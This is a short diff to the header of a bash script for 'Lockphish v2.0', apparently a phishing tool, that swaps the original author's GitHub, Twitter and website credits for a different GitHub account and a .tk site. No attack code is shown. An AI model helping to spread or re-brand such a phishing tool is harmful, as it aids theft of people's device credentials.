@@ -1,8 +1,7 @@
 #!/bin/bash
 # Lockphish v2.0
-# Coded by: github.com/kali-linux-tutorial/lockphish 
-# Twitter: twitter.com/kalilinux_in
-# https://www.kalilinux.in
+# Coded by: github.com/QatrixQuantum/lockphish 
+# http://www.heimanbotz.tk
 # Read the License before using any part from this code.
 
 trap 'printf "\n";stop' 2
